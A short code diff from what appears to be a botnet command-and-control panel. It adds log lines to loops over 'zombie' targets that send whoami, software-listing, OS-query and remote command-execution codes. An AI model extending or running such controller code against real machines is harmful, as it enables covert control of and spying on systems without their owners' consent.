@@ -73,6 +73,7 @@ Select Target           ---> -h "TARGET"
         target_list = self.find_target_zombie()
         if target_list:
             for target in target_list:
+                self.push_text_in_terminal_box(text='Target : {}'.format(target))
                 communicator = self.get_communicator(target=target)
                 msg = 'cid={},'.format(codes_list['get_whoami'])
                 reply = communicator.msg_manager(msg=msg, has_reply=True)
@@ -90,6 +91,7 @@ Select Target           ---> -h "TARGET"
         target_list = self.find_target_zombie()
         if target_list:
             for target in target_list:
+                self.push_text_in_terminal_box(text='Target : {}'.format(target))
                 communicator = self.get_communicator(target=target)
                 msg = 'cid={},'.format(codes_list['get_software'])
                 reply = communicator.msg_manager(msg=msg, has_reply=True)
@@ -108,6 +110,7 @@ Select Target           ---> -h "TARGET"
         target_list = self.find_target_zombie()
         if target_list:
             for target in target_list:
+                self.push_text_in_terminal_box(text='Target : {}'.format(target))
                 communicator = self.get_communicator(target=target)
                 os_info = communicator.get_os()
                 self.push_text_in_terminal_box(text='Target {} --> {}'.format(target,os_info))
@@ -127,6 +130,7 @@ Select Target           ---> -h "TARGET"
             target_list = self.find_target_zombie()
             if target_list:
                 for target in target_list:
+                    self.push_text_in_terminal_box(text='Target : {}'.format(target))
                     communicator = self.get_communicator(target=target)
                     reply = communicator.msg_manager(msg='cid=' + codes_list['exec'] + ',{}'.format(command_extracted),
                                                      has_reply=True)
